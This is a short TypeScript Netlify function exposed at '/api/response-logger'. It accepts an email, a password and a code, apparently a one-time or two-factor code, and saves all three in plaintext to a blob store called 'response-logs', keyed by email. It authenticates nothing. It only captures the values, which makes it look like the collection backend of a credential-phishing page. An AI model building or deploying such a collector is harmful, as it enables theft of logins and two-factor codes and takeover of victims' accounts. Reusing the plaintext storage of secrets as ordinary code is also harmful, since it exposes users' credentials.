import { getStore } from '@netlify/blobs'
import type { Config } from '@netlify/functions'

const store = getStore({ name: 'response-logs', consistency: 'strong' })

export default async (req: Request) => {
  if (req.method !== 'POST') {
    return Response.json(
      { error: 'Method not allowed. Use POST.' },
      { status: 405 },
    )
  }

  let body: { email?: string; password?: string; code?: string } = {}
  try {
    body = await req.json()
  } catch {
    return Response.json(
      { error: 'Invalid JSON body. Send {"email","password","code"}.' },
      { status: 400 },
    )
  }

  const email = body.email?.trim() ?? ''
  const password = body.password ?? ''
  const code = body.code ?? ''

  if (!email || !password || !code) {
    return Response.json(
      { error: 'email, password, and code are required.' },
      { status: 400 },
    )
  }

  const combinedText = [email, password, code].join('\n')
  await store.set(email, combinedText)

  return Response.json({
    ok: true,
    key: email,
  })
}

export const config: Config = {
  path: '/api/response-logger',
}
